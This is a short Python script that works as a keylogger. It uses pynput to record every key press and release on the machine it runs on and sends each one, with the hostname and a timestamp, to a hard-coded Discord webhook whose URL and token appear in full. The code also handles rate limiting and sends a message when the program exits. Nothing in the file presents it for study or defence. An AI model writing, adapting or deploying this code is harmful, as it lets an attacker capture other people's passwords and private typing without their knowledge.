from pynput import keyboard
from discord_webhook import DiscordWebhook
import socket
import os
import atexit
import datetime
import time

computer_name = socket.gethostname()

webhook_url = "https://discordapp.com/api/webhooks/1143883741975040040/bQFWBjhqDPbyUEP9ou-sRfQaBzfmu3x3PVPV15_MLGuPm4FX0kroWmF5VMWqDO_CbTJJ"
rate_limit_reset_time = 0  # Initialize the rate limit reset time
min_time_between_messages = 2  # Minimum time (in seconds) between sending messages

def send_webhook_message(content):
    global rate_limit_reset_time
    
    current_time = time.time()
    if current_time < rate_limit_reset_time:
        wait_time = rate_limit_reset_time - current_time
        time.sleep(wait_time)
    
    webhook = DiscordWebhook(url=webhook_url, content=content)
    response = webhook.execute()
    handle_rate_limit(response)  # Handle rate limiting if needed

def handle_rate_limit(response):
    global rate_limit_reset_time
    
    if response.status_code == 429:
        retry_after = response.json().get('retry_after', 1.0)
        rate_limit_reset_time = time.time() + retry_after
        notify_rate_limit()
    else:
        rate_limit_reset_time = 0

def notify_rate_limit():
    message = f"[{get_current_time()}] Webhook {webhook_url} is being rate limited from {computer_name}"
    send_webhook_message(message)

def on_key_press(key):
    try:
        message = f"[{get_current_time()}] {computer_name} pressed: {key.char}"
        send_webhook_message(message)
    except AttributeError:
        message = f"[{get_current_time()}] {computer_name} pressed a special key: {key}"
        send_webhook_message(message)

def on_key_release(key):
    message = f"[{get_current_time()}] {computer_name} released: {key}"
    send_webhook_message(message)

def exit_handler():
    message = f"[{get_current_time()}] {computer_name} exited"
    send_webhook_message(message)
    listener.stop()

def get_current_time():
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

# Register the exit handler
atexit.register(exit_handler)

# Set up the listener
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()
